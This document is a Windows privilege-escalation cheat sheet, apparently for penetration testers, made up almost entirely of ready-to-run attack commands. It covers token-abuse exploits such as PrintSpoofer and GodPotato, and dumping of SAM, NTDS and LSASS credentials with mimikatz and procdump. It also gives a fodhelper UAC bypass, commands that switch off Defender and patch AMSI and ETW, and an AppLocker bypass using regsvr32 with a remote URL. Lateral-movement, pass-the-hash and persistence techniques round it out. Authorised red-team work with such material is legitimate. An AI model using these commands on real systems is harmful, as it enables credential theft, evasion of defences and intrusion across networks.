# Windows Privilege Escalation

## 1. Enumeration

```powershell
whoami /all
systeminfo
wmic qfe list brief
net user; net localgroup administrators; net group "Domain Admins" /domain
ipconfig /all; route print; arp -a
Get-Process | Select Name,Id,Path
Get-CimInstance Win32_Service | Select Name,PathName,StartName,StartMode
Get-ScheduledTask | Select TaskName,TaskPath,State
cmdkey /list
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
```

Tools: `winPEASx64.exe`, `Seatbelt.exe -group=all`, `SharpUp.exe audit`, `PowerUp.ps1 Invoke-AllChecks`, `PrivescCheck.ps1`, `winPEAS.bat`.

## 2. Token privileges

```powershell
whoami /priv
```

| Privilege | Abuse |
| --- | --- |
| SeImpersonate / SeAssignPrimaryToken | JuicyPotato, RoguePotato, PrintSpoofer, GodPotato, SweetPotato |
| SeBackup / SeRestore | Copy SAM/SYSTEM/NTDS via `robocopy /b` or `diskshadow` |
| SeDebug | Dump LSASS, inject into privileged process |
| SeTakeOwnership | Take file/registry ownership |
| SeLoadDriver | Load vulnerable signed driver |
| SeManageVolume | Read raw volume / arbitrary file write |
| SeTcbPrivilege | Create token with arbitrary SID |
| SeCreateToken | Forge token |
| SeRelabel / SeRestore | Write protected files |

```powershell
GodPotato.exe -cmd "cmd /c whoami"
PrintSpoofer.exe -i -c cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}
# Backup operator
diskshadow /s script.txt   # then copy NTDS.dit
robocopy /b C:\Windows\System32\config C:\tmp SAM SYSTEM SECURITY
```

## 3. Services & tasks

```powershell
# Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# ACL checks
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" *
icacls "C:\Path\To\Service.exe"
# Weak dir ACL -> replace binary; weak service ACL -> config binpath
sc config vuln binpath= "C:\tmp\shell.exe"
sc stop vuln & sc start vuln
```

DLL hijack: missing DLL in a writable dir on a service's search order. Use Process Monitor to find `NAME NOT FOUND` on a writable path.

`AlwaysInstallElevated`:
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\tmp\evil.msi
```

Scheduled task: writable script/binary, writable task XML, `schtasks /change`.

## 4. UAC bypass

```powershell
# fodhelper
New-Item HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force
Set-ItemProperty HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value ''
Set-ItemProperty HKCU:\Software\Classes\ms-settings\Shell\Open\command -Value "cmd /c start cmd.exe"
fodhelper.exe
```
Others: `computerdefaults.exe`, `eventvwr.exe`, `sdclt.exe`, `CMSTP`, `wsreset.exe`, `UACME` (akagi64). Only relevant when the user is a local admin in a non-elevated context.

## 5. Credentials

```powershell
# Registry hives
reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv; reg save HKLM\SECURITY sec.hiv
impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL

# LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\tmp\lsass.dmp full
impacket-secretsdump -ntds ntds.dit -system sys.hiv LOCAL

# DPAPI
mimikatz # dpapi::masterkey /in:<key> /rpc
mimikatz # dpapi::chrome /in:"...\Login Data"
SharpDPAPI.exe credentials /unprotect

# Other
cmdkey /list; type %APPDATA%\Microsoft\Credentials\*
findstr /si password *.xml *.ini *.txt *.config
type C:\Windows\Panther\Unattend.xml
netsh wlan show profile name="X" key=clear
```

Local admin hash reuse: `nxc smb targets.txt -u administrator -H <hash> --local-auth`.

## 6. AV / EDR

```powershell
Get-MpComputerStatus
Get-MpPreference | Select ExclusionPath,ExclusionProcess
Add-MpPreference -ExclusionPath C:\tmp
Set-MpPreference -DisableRealtimeMonitoring $true
```

- **AMSI bypass:** in-memory patch of `amsi.dll!AmsiScanBuffer` (careful with signatures), or .NET `amsiInitFailed` field.
- **ETW patch:** `EtwEventWrite` → `ret`.
- **AppLocker/WDAC:** `Get-AppLockerPolicy -Effective -Xml`; bypass with LOLBAS (`MSBuild.exe`, `InstallUtil.exe`, `regsvr32 /s /u /i:http://...`, `rundll32`, `wmic`, `mshta`), writable allowed paths, `C:\Windows\Temp`, `%TEMP%`.
- **Constrained Language Mode:** `$ExecutionContext.SessionState.LanguageMode`; bypass via `InstallUtil`, custom runspace, `System.Management.Automation` reflection.
- **PowerShell logging:** ScriptBlock logging, transcription, AMSI. Prefer `-enc` only as a last resort (highly signatured).

## 7. Lateral movement

```powershell
# From Windows
PsExec64.exe \\host -u dom\user -p pass cmd
wmic /node:host process call create "cmd /c ..."
winrs -r:host -u:user -p:pass cmd
Invoke-Command -ComputerName host -ScriptBlock {whoami}
Enter-PSSession -ComputerName host

# From Linux
impacket-psexec dom/user:pass@host
impacket-wmiexec dom/user:pass@host
impacket-atexec dom/user:pass@host whoami
nxc winrm host -u user -p pass -x whoami
xfreerdp /v:host /u:user /pth:<hash>
```

Pass-the-hash/ticket/overpass-the-hash: `mimikatz # sekurlsa::pth /user:u /domain:d /ntlm:<hash> /run:cmd`, `Rubeus asktgt /user:u /rc4:<hash> /ptt`.

## 8. Persistence (approved RT only)

- Registry: `HKCU\...\Run`, `HKLM\...\Run`, `Winlogon\Shell`, `Image File Execution Options`, `COM hijack`.
- Services, scheduled tasks, WMI event subscription (`__EventFilter` + `CommandLineEventConsumer`).
- Startup folder, logon scripts (GPO), `userinit`, `AppInit_DLLs`.
- Accessibility: `sethc.exe`/`utilman.exe` replacement (needs console access).
- BITS jobs, SSP (`mimilib`), DLL search order.
- Domain: AdminSDHolder, SID history, golden ticket, DSRM, skeleton key.

## 9. Triage order

1. `whoami /priv` → SeImpersonate/SeBackup.
2. Service ACLs and unquoted paths.
3. Saved credentials (`cmdkey`, DPAPI, unattend).
4. Local admin reuse across the estate.
5. Missing patches vs `systeminfo` hotfix list.
6. AV/AppLocker posture before dropping tooling.
